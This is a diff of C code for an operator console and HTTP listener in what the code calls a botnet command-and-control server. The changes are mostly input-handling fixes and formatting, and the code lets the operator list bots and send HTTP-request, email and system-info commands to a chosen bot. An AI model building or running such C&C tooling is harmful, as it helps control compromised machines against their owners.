@@ -71,69 +71,78 @@ void parent(/*int pid*/)
     while (1)
     {
 
-        char command[10];
+        char command[11] ;
         printf("\nInsert Command : ");
 
-        
-        fgets(command, 10, stdin) ;
         fflush(stdin);
-
-        if (strcmp(command, LIST) == 0)
+        char *res;
+        if (fgets(command, 10, stdin) == NULL)
         {
-            printf("\nListing active bots of current botnet ");
-
-            list_botnet(1);
-        }
-        else if (strcmp(command, QUIT) == 0)
-        {
-            printf("\nStop C&C ");
-            free(botnet);
-
-            ret = closeSemaphores();
-            if (ret < 0)
-            {
-                handle_error("Failed to close semaphores");
-            }
-
-            MHD_stop_daemon(mhd_daemon);
-
-            // kill(pid, SIGKILL);
-
-            exit(EXIT_SUCCESS);
-        }
-        else if (strcmp(command, "\n") == 0)
-        {
-        }
-        // maybe just one or multiple | statements
-
-        else if (strcmp(command, HTTP_REQ) == 0 | strcmp(command, EMAIL) == 0 | strcmp(command, SYS_INFO) == 0)
-        {
-            printf("\nChoose bot to which send command ");
-
-            ret = list_botnet(0);
-
-            if (ret < 0)
-                continue;
-
-            char bot_id[100];
-            fgets(bot_id, 100, stdin);
-            int bot = atoi(bot_id);
-
-            if (botExists(bot) < 0)
-            {
-                printf("\nNot a valid bot id ");
-                continue;
-            }
-            else
-            {
-                sendCommand(command, bot);
-            }
+            fflush(stdin);
+            clearerr(stdin);
+            continue;
+            
         }
         else
         {
-            printf("\nError, command not supported choose one from the following available commands: \n %s \n %s \n %s \n %s \n %s",
-                   HTTP_REQ, LIST, EMAIL, SYS_INFO, QUIT);
-            continue;
+
+            if (strcmp(command, LIST) == 0)
+            {
+                printf("\nListing active bots of current botnet \n");
+
+                list_botnet(1);
+            }
+            else if (strcmp(command, QUIT) == 0)
+            {
+                printf("\nStop C&C \n");
+                free(botnet);
+
+                ret = closeSemaphores();
+                if (ret < 0)
+                {
+                    handle_error("Failed to close semaphores");
+                }
+
+                MHD_stop_daemon(mhd_daemon);
+
+                // kill(pid, SIGKILL);
+
+                exit(EXIT_SUCCESS);
+            }
+            else if (strcmp(command, "\n") == 0)
+            {
+            }
+            // maybe just one or multiple | statements
+
+            else if (strcmp(command, HTTP_REQ) == 0 | strcmp(command, EMAIL) == 0 | strcmp(command, SYS_INFO) == 0)
+            {
+                printf("\nChoose bot to which send command ");
+
+                ret = list_botnet(0);
+
+                if (ret < 0)
+                    continue;
+
+                char bot_id[100];
+                fgets(bot_id, 100, stdin);
+                int bot = atoi(bot_id);
+
+                if (botExists(bot) < 0)
+                {
+                    printf("\nNot a valid bot id ");
+                    continue;
+                }
+                else
+                {
+                    sendCommand(command, bot);
+                }
+            }
+            else
+            {
+                printf("\nError, command not supported choose one from the following available commands: \n %s \n %s \n %s \n %s \n %s ",
+                       HTTP_REQ, LIST, EMAIL, SYS_INFO, QUIT);
+                continue;
+            }
         }
     }
 }
@@ -153,13 +162,11 @@ void child()
     struct hostent *host_entry;
     int hostname;
     char host[256];
-    char * IP;
-    
+    char *IP;
+
     hostname = gethostname(host, sizeof(host));                      // find the host name
     host_entry = gethostbyname(host);                                // find host information
     IP = inet_ntoa(*((struct in_addr *)host_entry->h_addr_list[0])); // Convert into IP string
-
-
 
     printf("\nChild process started. Listening on port %d. with Ip : %s\n", 8081, IP);
     while (1)
@@ -301,12 +308,13 @@ int handle_request(void *cls, struct MHD_Connection *connection, const char *url
         int ID = getBotID(bot_ip, bot_port);
         if (ID == -1)
         {
-            printf("\nBOT %s:%s not present in botnet", bot_ip,bot_port);
-        }else{
-
-            updateBotInfo(ID,"","");
+            printf("\nBOT %s:%s not present in botnet", bot_ip, bot_port);
         }
+        else
+        {
 
+            updateBotInfo(ID, "void", "void");
+        }
 
         endpoint = NULL;
     }
